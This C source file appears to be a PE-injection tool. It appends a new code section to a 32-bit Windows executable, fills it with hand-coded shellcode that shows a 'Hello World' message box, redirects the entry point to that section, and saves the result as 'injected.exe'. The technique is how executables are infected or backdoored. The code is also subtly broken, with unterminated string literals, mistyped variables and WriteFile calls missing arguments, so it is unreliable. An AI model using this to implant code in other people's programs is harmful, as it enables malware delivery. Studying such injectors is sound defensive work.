#include <Windows.h>

DWORD sectionContainRVA(DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
	for (int i = 0; i < numberOfSection; i++) {
		PIMAGE_SECTION_HEADER tmp = p + i;
		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize) return tmp->VirtualAddress;
	}
	return -1;
}

LPVOID rawAddressSectionContainRVA(LPVOID data, DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
	for (int i = 0; i < numberOfSection; i++) {
		PIMAGE_SECTION_HEADER tmp = p + i;
		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize)
			return data + tmp->PointerToRawData;
	}
	return -1;
}

LPVOID rawAddressInDump(LPVOID data, DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
	for (int i = 0; i < numberOfSection; i++) {
		PIMAGE_SECTION_HEADER tmp = p + i;
		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize)
			return data + tmp->PointerToRawData + rva - tmp->VirtualAddress;
	}
	return -1;
}

DWORD ordinalNumberSectionContainRVA(DWORD rva, int numberOfSection, PIMAGE_SECTION_HEADER p) {
	for (int i = 0; i < numberOfSection; i++) {
		PIMAGE_SECTION_HEADER tmp = p + i;
		if (tmp->VirtualAddress <= rva && rva < tmp->VirtualAddress + tmp->Misc.VirtualSize) return i;
	}
	return -1;
}

int main(int argc, char * argv[]) {
	wchar_t filename[50];
	if (argc == 1) {
		printf("Usage: PEInjection <filename>\n");
		return 0;
	}
	MultiByteToWideChar(
		CP_OEMCP,
		MB_PRECOMPOSED,
		argv[1],
		-1,
		filename,
		NULL
	);
	DWORD fileHandle = CreateFile(filename, GENERIC_READ, 0, NULL, 3, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		printf("[x] Invalid File\n");
		return -1;
	}

	DWORD fileSize = GetFileSize(fileSize, NULL);
	LPVOID data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
	DWORD numberOfByteToRead;
	ReadFile(fileHandle, data, fileSize, &numberOfByteToRead, NULL);
	PIMAGE_DOS_HEADER pFileDosHeader = (PIMAGE_DOS_HEADER)data;
	DWORD bits = *(DWORD*)(data + pFileDosHeader->e_lfanew + sizeof(IMAGE_FILE_HEADER));
	if (bits == 0x10b) {
		PIMAGE_NT_HEADERS32	pFileNTHeader = (PIMAGE_NT_HEADERS32)(data + pFileDosHeader->e_lfanew);
		DWORD numberOfSection = pFileNTHeader->FileHeader.NumberOfSections;
		PIMAGE_SECTION_HEADER pFileSectionHeaderTable = (PIMAGE_SECTION_HEADER)((char*)pFileNTHeader + sizeof(IMAGE_NT_HEADERS32));
		PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + (numberOfSection - 1);
		DWORD injectSectionRVA = tmp->VirtualAddress + tmp->Misc.VirtualSize;
		DWORD injectSectionVSize = 50 * pFileNTHeader->OptionalHeader.SectionAlignment;
		DWORD injectSectionRSize = 50 * pFileNTHeader->OptionalHeader.FileAlignment;
		DWORD injectSectionPointerToRawData = tmp->PointerToRawData + tmp->SizeOfRawData;
		// craft new section
		LPVOID shellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, injectSectionRSize);
		char HelloWorld[] = "Hello World\0";
		char Caption[] = "Caption\0";
		char User32Dll = "User32.dll\0";
		char getProcaddr[] = "GetProcAddress\0";
		char loadLib[] = "LoadLibraryA\0";
		char messageBox[] = "MessageBoxA\0";
		
		DWORD helloWorldRVA = injectSectionRVA + 1000;
		DWORD captionRVA = injectSectionRVA + 1000 + strlen(HelloWorld);
		DWORD user32RVA = captionRVA + strlen(Caption);
		DWORD getProcRVA = user32RVA + strlen(User32Dll);
		DWORD loadlibRVA = getProcRVA + strlen(getProcaddr);
		DWORD messageRVA = loadlibRVA + strlen(loadLib);

		CopyMemory(shellcode, 
			"\x55\x8B\xEC\x83\xEC\x24\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B"
			"\x40\x14\x8B\x00\x8B\x00\x8B\x40\x10\x89\x44\x24\x20\x8B\x5C\x24"
			"\x20\x33\xD2\x8A\x53\x3C\x83\xC3\x04\x03\xDA\x83\xC3\x14\x33\xD2"
			"\x66\x8B\x13\x89\x54\x24\x1C\x83\xC3\x18\x8B\x54\x24\x1C\x81\xFA"
			"\x0B\x01\x00\x00\x75\x05\x83\xC3\x48\xEB\x03\x83\xC3\x58\x8B\x03"
			"\x8B\x54\x24\x20\x03\xD0\x89\x54\x24\x18\x8B\x44\x24\x20\x8B\x5A"
			"\x1C\x03\xD8\x89\x5C\x24\x24\x8B\x5A\x24\x03\x5C\x24\x20\x8B\x52"
			"\x20\x03\xD0\x33\xC9\x8B\x44\x24\x20\x03\x02\x50"
			"\x8d\x05", 
			126);
		CopyMemory(shellcode + 126, &loadlibRVA, 4);
		CopyMemory(shellcode + 130,
			"\x50\xE8\xA1\x00\x00\x00\x83\xC4\x08\x85\xC0\x75\x15\x41"
			"\x33\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24\x24\x8B\x00\x89\x44"
			"\x24\x14\xEB\x2D\x8B\x44\x24\x20\x03\x02\x50\x8D\x05", 43);
		CopyMemory(shellcode + 173, &getProcRVA, 4);
		CopyMemory(shellcode + 177,
			"\x50\xE8\x72\x00\x00\x00\x83\xC4\x08\x85\xC0\x75\x13\x41\x33
			"\xC0\x66\x8B\x03\xC1\xE0\x02\x03\x44\x24\x24\x8B\x00\x89\x44\x24"
			"\x10\x83\xC2\x04\x83\xC3\x02\x83\xF9\x02\x75\x99\x8B\x5C\x24\x14"
			"\x03\x5C\x24\x20\x8D\x05", 53);
		CopyMemory(shellcode + 230, &user32RVA, 4);
		CopyMemory(shellcode + 234,
			"\x50\xFF\xD3\x89\x44\x24"
			"\x08\x8B\x5C\x24\x10\x03\x5C\x24\x20\x8D\x05", 17);
		CopyMemory(shellcode + 251, &messageRVA, 4);
		CopyMemory(shellcode + 255,
			"\x50
			"\x8B\x44\x24\x0C\x50\xFF\xD3\x89\x44\x24\x04\x8B\x5C\x24\x04\x33"
			"\xC0\x50\x8D\x05", 21);
		CopyMemory(shellcode + 276, &captionRVA, 4);
		CopyMemory(shellcode + 280, "\x50\x8D\x05", 3);
		CopyMemory(shellcode + 283, &helloworldRVA, 4);
		CopyMemory(shellcode + 287,
			"\x50
			"\x33\xC0\x50\xFF\xD3\x83\xC4\x20\x5D\x55\x8B\xEC\x52\x53\x56\x57"
			"\x33\xC0\x8B\x74\x24\x18\x8B\x7C\x24\x1C\x8A\x06\x8A\x27\x84\xC0"
			"\x74\x0E\x84\xE4\x74\x0A\x2A\xC4\x32\xE4\x46\x47\x84\xC0\x74\xEA"
			"\x5F\x5E\x5B\x5A\x5D\xC3", 55);
		DWORD entryPointRVA = pFileNTHeader->OptionalHeader.AddressOfEntryPoint + pFileNTHeader->OptionalHeader.ImageBase;
		CopyMemory(shellcode + 342, "\xff", 1);
		CopyMemory(shellcode + 343, &entryPointRVA, 4);
		CopyMemory(shellcode + 1000, HelloWorld, strlen(HelloWorld));
		CopyMemory(shellcode + 1000 + strlen(HelloWorld), Caption, strlen(Caption));
		CopyMemory(shellcode + 1000 + strlen(HelloWorld) + strlen(Caption), User32Dll, strlen(User32Dll));
		CopyMemory(shellcode + 1000 + strlen(HelloWorld) + strlen(Caption) + strlen(User32Dll),
			getProcaddr, strlen(getProcaddr));
		CopyMemory(shellcode + 1000 + strlen(HelloWorld) + strlen(Caption) + strlen(User32Dll) + strlen(getProcaddr),
			loadLib, strlen(loadLib));
		CopyMemory(shellcode + 1000 + strlen(HelloWorld) + strlen(Caption) + strlen(User32Dll) + strlen(getProcaddr) + strlen(loadLib),
			messageBox, strlen(messageBox));
		// fix header
		IMAGE_DOS_HEADER injectDOSheader = *pFileDosHeader;
		IMAGE_NT_HEADERS32 injectNTHeader = *pFileNTHeader;
		injectNTHeader.FileHeader.NumberOfSections += 1;
		injectNTHeader.OptionalHeader.SizeOfCode += injectSectionRSize;
		injectNTHeader.OptionalHeader.SizeOfImage += injectSectionVSize;
		injectNTHeader.OptionalHeader.AddressOfEntryPoint = injectSectionRVA;
		HANDLE newFile = CreateFile(
			"injected.exe",
			GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			CREATE_NEW,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		WriteFile(newFile, &injectDOSheader, sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
		WriteFile(newFile, data + sizeof(IMAGE_DOS_HEADER), pFileDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER), &numberOfByteToRead, NULL);
		WriteFile(newFile, &injectNTHeader, sizeof(IMAGE_NT_HEADER), &numberOfByteToRead, NULL);
		for (int i = 0; i < numberOfSection; i++) {
			PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + i;
			WriteFile(newFile, tmp, sizeof(IMAGE_SECTION_HEADER));
		}
		IMAGE_SECTION_HEADER injectSectionHeader;
		injectSectionHeader.VirtualSize = injectSectionVSize;
		injectSectionHeader.SizeOfRawData = injectSectionRSize;
		injectSectionHeader.VirtualAddress = injectSectionRVA;
		injectSectionHeader.PointerToRawData = injectSectionPointerToRawData;
		injectSectionHeader.PointerToRelocations = 0;
		injectSectionHeader.PointerToLinenumbers = 0;
		injectSectionHeader.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
		injectSectionHeader.NumberOfLinenumbers = 0;
		injectSectionHeader.NumberOfRelocations = 0;

		WriteFile(newFile, &injectSectionHeader, sizeof(IMAGE_SECTION_HEADER));
		DWORD startOfSection = pFileSectionHeaderTable->PointerToRawData;
		DWORD currPointer = SetFilePointer(newFile, 0, NULL, FILE_CURRENT);
		while (currPointer < startOfSection) {
			WriteFile(newFile, "\0", 1);
			currPointer++;
		}
		for (int i = 0; i < numberOfSection; i++) {
			PIMAGE_SECTION_HEADER tmp = pFileSectionHeaderTable + i;
			LPVOID section = data + tmp->PointerToRawData;
			WriteFile(newFile, section, tmp->SizeOfRawData);
		}
		WriteFile(newFile, shellcode, injectSectionRSize);
		CloseHandle(newFile);
	}
}